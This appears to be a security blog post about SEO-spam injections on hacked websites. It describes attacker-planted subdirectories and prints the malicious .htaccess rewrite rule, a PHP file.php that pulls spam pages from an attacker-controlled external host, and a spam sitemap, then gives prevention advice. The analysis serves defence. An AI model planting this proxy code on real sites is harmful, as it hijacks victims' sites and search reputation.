@@ -1,0 +1,96 @@
+Cloned Spam Sites in Subdirectories
+
+In a recent post, we covered how attackers were abusing server resources to create WordPress sites in subdirectories and distribute spam. By adding a complete WordPress CMS installation into a directory and using the victim’s database structure, attackers were able to inject ads and promote their products – a very bold move.
+This time around, attackers used a different technique and structure to accomplish the same task.
+Infection Patterns
+Instead of adding WordPress subsites and using the local database, they decided to fetch all of the information from external sources under their control.
+With just a few files, attackers created a clone army of spam sites:
+
+Different directories were added to the website’s root (kate, head, lug, real)
+Inside those directories, attackers added a set of files:
+
+.htaccess
+file.php
+Google verification file (googleb6b3096ab39ee543.html, for instance)
+sitemap.xml
+
+This infection would result in the website displaying the following spam page under specific scenarios:
+Cigarettes spam post on victim site
+As you can see, the subdirectory appears to be part of the victim site. Spammy pages like this one are often flagged by search engines as hacked content. In this case, Google SERPs (Search Engine Result Pages) will show a warning indicating, “This site may be hacked” to any users trying to access the victim website through Google search:
+“This site may be hacked” warning in Google search results
+How Does the Attack Work?
+Let’s analyze the infection file-by-file.
+First, the malicious folders have the following content in their “.htaccess” files:
+RewriteEngine On
+RewriteRule ^([a-zA-Z0-9]+)-([a-zA-Z0-9]+)-([0-9]+)\.html$ file.php?p=$1-$2-$3 [L]
+This regular expression basically means that any request to the following URL:
+www.infected-site.com/badfolder/cigarettes-<random string>-<random number>.html
+Would be rewritten as:
+www.infected-site.com/badfolder/file.php?p=cigarettes-<random string>-<random number>
+This rewritten path is used to fetch spam content from an external site, which is passed as an argument in file.php to variable p.
+So, what does file.php do? Here are the contents of the file:
+<?php
+error_reporting(E_ERROR);
+set_time_limit(0);
+if(!empty($_REQUEST["p"]))
+{
+$p=$_REQUEST["p"];
+$url_path="http://www[.]shopping2016[.]cc/<another random string>/";
+$file_extend=".html";
+$url_full=$url_path.$p.$file_extend;
+try
+{
+$body= curlOpen($url_full);
+}
+catch (Exception $w){}
+
+if($body=="")
+{
+try
+{
+$body= file_get_contents($url_full);
+}
+catch (Exception $w){}
+}
+echo $body;
+exit;
+}
+
+function curlOpen($remote_url)
+{
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $remote_url);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch2, CURLOPT_TIMEOUT,30);
+$contents = curl_exec($ch2);
+curl_close($ch2);
+return $contents;
+}
+?>
+This file is responsible for fetching spam content from the following malicious website:
+hxxp://www[.]shopping2016[.]cc/<another random string>/cigarettes-<random string>-<random number>.html.
+In fact, if you access this site you’ll see the same content as the spam page:
+Cigarettes spam post from www[.]shopping2016[.]cc
+Google Site Ownership
+The Google HTML file found in those directories is used to verify website ownership on Google Webmaster Tools and Google Analytics. This allows attackers to track stats and data about the compromised website, including information about visitor behavior, traffic sources, security notifications, and search engine keyword data.
+The sitemap.xml file, included as part of the hack, lists the spam pages of the cloned site. This tells Google and other search engines which pages to index as part of their search results.
+When checking that particular file, we identified around 3000 different spam pages that could be indexed by search engines.
+Here is a very small snippet of the sitemap:
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+<url>
+<loc>http://www.infected-site.com/badfolder/cigarettes-<random string 1>-<random number 1>.html</loc>
+</url>
+…
+<url>
+<loc>http://www.infected-site.com/badfolder/cigarettes-<random string 3001>-<random number 3001>.html</loc>
+</url>
+</urlset>
+How to Prevent Infection
+In this case, the website became infected because it had been running an outdated Joomla! version that contained known vulnerabilities.
+Here are some steps to protect your site moving forward:
+Update your software. This includes your CMS (WordPress, Joomla, etc.), plugins, themes, and extensions. Outdated software is the leading cause of website infections and reinfections.
+Use strong passwords. From your administrator login page to FTP, always choose long, complex, and unique passwords.
+Check your core file integrity. Backdoors and other malicious codes are often inserted into core files. If you’re using WordPress, you can install our plugin which provides a core files integrity check.
+Use a Web Application Firewall. A WAF will filter all HTTP/HTTPS traffic between your server and your visitors, blocking known attacks and virtually patching your site even if you forget to update.
+If you think your website has been infected and need specialized assistance in website security, let us know.
